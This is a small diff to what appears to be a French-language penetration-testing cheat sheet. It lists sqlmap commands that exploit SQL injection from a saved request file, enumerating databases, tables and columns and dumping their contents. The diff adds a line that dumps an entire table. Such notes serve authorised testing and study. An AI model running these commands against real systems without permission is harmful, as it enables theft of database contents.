@@ -15,6 +15,7 @@ sqlmap -r req.txt
 sqlmap -r req.txt --dbs
 sqlmap -r req.txt -D <NOM_DB> --tables
 sqlmap -r req.txt -D <NOM_DB> -T <NOM_TABLE> --columns
+sqlmap -r req.txt -D <NOM_DB> -T <NOM_TABLE> --dump
 sqlmap -r req.txt -D <NOM_DB> -T <NOM_TABLE> -C <col1>,<col2>,<col3> --dump
 
 ```
